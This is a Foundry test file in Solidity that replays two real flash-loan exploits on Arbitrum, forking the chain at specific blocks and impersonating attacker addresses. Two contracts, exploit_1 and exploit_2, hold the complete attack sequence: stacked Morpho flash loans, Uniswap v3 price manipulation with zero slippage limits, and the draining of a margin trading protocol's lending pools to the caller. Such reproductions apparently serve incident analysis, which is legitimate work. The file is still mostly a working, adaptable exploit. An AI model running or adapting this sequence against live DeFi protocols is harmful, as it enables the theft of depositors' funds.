// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external returns (uint);
    function transfer(address,uint) external returns (bool);
}
interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes memory data) external;
}

struct ExactInputParams {
    bytes path;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
}

struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    uint24 fee;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}
interface ITrade{
    function decreaseLongPosition(
        uint marginAccountID, 
        address token,
        uint amount
    ) external;
}
interface ILiquiditypool{
    function provide(uint amount) external;
    function withdraw(uint amount) external;
}

interface IMargin{
    function provideERC20(uint marginAccountID, address token, uint amount) external;
    function borrow(uint marginAccountID, address token, uint amount) external;
    function withdrawERC20(uint marginAccountID, address token, uint amount) external;
    function swap(uint marginAccountID, address tokenIn, address tokenOut, uint amountIn, uint amountOutMinimum) external;

}
    
interface ISwapRouter{
    function exactInput(ExactInputParams memory params) external;
    function exactInputSingle(ExactInputSingleParams memory params) external;
}
contract CounterTest is Test {
    address exploiter = 0xD356c82e0C85E1568641D084DbDAF76B8Df96c08;
    address exploiter_2 = 0xAA24987Bab540617416B77c986f66Ae009C55795;
    address exploit_contract = 0xd9ff21caEEEa4329133c98A892db16b42f9BaA25;
    address exploit_contract_2 =0x397652cC4E0C0D3f1aA859C9bf827480c35B03bE;
    address morpho = 0x6c247b1F6182318877311737BaC0844bAa518F5e;
    address margin_account = 0x4fb8D765b915B88b6F6cf6734E8E6c6b4FAAf13A;
    
    exploit_1 ex;
    exploit_2 ex2;
    function setUp() public {
        vm.createSelectFork("arbitrum",391402389-1);
    }
    //TX : https://app.blocksec.com/explorer/tx/arbitrum/0x9f8b4841f805ec50cc6632068f759216d85633fbbe34afde86b97bbc41c23ead
    function testExploit() public{
        vm.startPrank(exploiter);
        ex = new exploit_1();
        bytes memory code = address(ex).code;
        vm.etch(exploit_contract,code);
        
        exploit_1 ExploitContract = exploit_1(exploit_contract);
        ExploitContract.mint(3700000000);
        vm.stopPrank();
    }

    // TX : https://app.blocksec.com/explorer/tx/arbitrum/0xb0bf77475818b2501e78f0927f4131e52c6efd45bc4978992cbbe218a57e6f7f
    function testExploit2() public{
        vm.rollFork(391450359-1);
        ex2 = new exploit_2();
        bytes memory code = address(ex2).code;
        exploit_2 ExploitContract2 = exploit_2(exploit_contract_2);
        vm.etch(exploit_contract_2,code);
        vm.startPrank(exploiter_2);
        ExploitContract2.approve(morpho, margin_account);
        vm.stopPrank();
    }

}

contract exploit_1{
    address constant wbtc = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant usdc = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant univ3Router= 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant TradeRouter =0xd3fdE5AF30DA1F394d6e0D361B552648D0dff797;
    address constant morpho = 0x6c247b1F6182318877311737BaC0844bAa518F5e;

    function mint(uint amount) public{
        IMorpho(morpho).flashLoan(wbtc, amount, "");
        require(IERC20(wbtc).balanceOf(address(this))==30750293);
        IERC20(wbtc).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256 amount, bytes memory data) public{
        IERC20(wbtc).approve(univ3Router,amount);
        IERC20(usdc).approve(univ3Router,type(uint).max);
        
        bytes memory _path = hex"2f2a2543b76a4166549f7aab2e75bef0aefc5b0f0001f4af88d065e77c8cc2239327c5edb3a432268e5831";
        bytes memory _path2 = hex"af88d065e77c8cc2239327c5edb3a432268e58310001f42f2a2543b76a4166549f7aab2e75bef0aefc5b0f";
        
        ExactInputParams memory param = ExactInputParams({
            path:_path,
            recipient:address(this),
            deadline:1760935141,
            amountIn:amount,
            amountOutMinimum:0
            }
        );
        ISwapRouter(univ3Router).exactInput(param);
        ITrade(TradeRouter).decreaseLongPosition(18, wbtc, 36199999);

        ExactInputParams memory param2 = ExactInputParams({
            path:_path2,
            recipient:address(this),
            deadline:1760935141,
            amountIn:3743028284419,
            amountOutMinimum:0
            }
        );
        ISwapRouter(univ3Router).exactInput(param2);
        IERC20(wbtc).approve(morpho,type(uint).max);
    }
}

contract exploit_2{
    uint _onMorphoFlashLoan;
    address constant wbtc = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant weth = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant usdc = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address morpho;
    address constant SF_LP_usdc = 0x9B6Ceb59bBe4e98E6EDEa6226A07A0B3C8Aa7320;
    address constant SF_LP_wbtc = 0x6736dA3cC7f28817D4060947d41b92B26495C96D;
    address constant SF_LP_weth = 0xB17E214D94350274723Ff4Ba85015aFfdDEEe84B;
    address constant margin = 0xeAc9a2fB46C9E123c04Bf0CDD850b4A6b6489E8d;
    address margin_account;
    address constant v3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    function approve(address approveAddr1, address approveAddr2) public{
        _onMorphoFlashLoan=1;
        morpho = approveAddr1;
        margin_account=approveAddr2;

        IERC20(wbtc).approve(morpho, type(uint).max);
        IERC20(weth).approve(morpho, type(uint).max);
        IERC20(usdc).approve(morpho, type(uint).max);

        IMorpho(morpho).flashLoan(wbtc, 5391271319, "");
        require(IERC20(wbtc).balanceOf(address(this))==40264081);
        require(IERC20(weth).balanceOf(address(this))==10000413246997093659);
        require(IERC20(usdc).balanceOf(address(this))==0);
            
        IERC20(wbtc).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
        IERC20(weth).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
        IERC20(usdc).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
    }
    
    function onMorphoFlashLoan(uint256 amount, bytes memory data) public{ 
    
    if(_onMorphoFlashLoan == 1){
        _onMorphoFlashLoan=2;
         IMorpho(morpho).flashLoan(usdc, 38233256916709, "");
    }
    else if(_onMorphoFlashLoan == 2){
        _onMorphoFlashLoan=3;
        IMorpho(morpho).flashLoan(weth, 50291865125573002321, "");
    }
    else{
        IERC20(usdc).approve(margin, type(uint).max);
        IERC20(usdc).approve(SF_LP_usdc, type(uint).max);
        IERC20(wbtc).approve(SF_LP_wbtc, type(uint).max);
        IERC20(weth).approve(SF_LP_weth, type(uint).max);
        
        ILiquiditypool(SF_LP_usdc).provide(30000000000);
        ILiquiditypool(SF_LP_wbtc).provide(10000000);
        ILiquiditypool(SF_LP_weth).provide(3000000000000000000);
        IERC20(wbtc).approve(margin_account, type(uint).max);
        IMargin(margin).provideERC20(73, wbtc, 129980144);
        IMargin(margin).borrow(73, usdc, 49974541905);
        IMargin(margin).borrow(73, wbtc, 29980144);
        IMargin(margin).borrow(73, weth, 10000413246997093660);

        ILiquiditypool(SF_LP_usdc).withdraw(29999334106770434405967);
        ILiquiditypool(SF_LP_wbtc).withdraw(99999950016519540);
        ILiquiditypool(SF_LP_weth).withdraw(2999983118360238760);

        IMargin(margin).withdrawERC20(73, usdc, 49974541905);
        IMargin(margin).withdrawERC20(73, wbtc, 29980144);
        IMargin(margin).withdrawERC20(73, weth, 10000413246997093660);

        IERC20(wbtc).approve(v3Router, 5291271318);

        ExactInputSingleParams memory param = ExactInputSingleParams({
            tokenIn:wbtc,
            tokenOut:usdc,
            fee:500,
            recipient:address(this),
            deadline:1760946848,
            amountIn:5291271318,
            amountOutMinimum:0,
            sqrtPriceLimitX96:0
        });

        ExactInputSingleParams memory param2 = ExactInputSingleParams({
            tokenIn:usdc,
            tokenOut:wbtc,
            fee:500,
            recipient:address(this),
            deadline:1760946848,
            amountIn:4211774141962,
            amountOutMinimum:0,
            sqrtPriceLimitX96:0
        });
        
        ISwapRouter(v3Router).exactInputSingle(param);
        IMargin(margin).swap(73,wbtc,usdc,100000000,0);

        IERC20(usdc).approve(v3Router,4211774141962);
        ISwapRouter(v3Router).exactInputSingle(param2);
        IERC20(usdc).approve(morpho,amount);
        }
    }
}
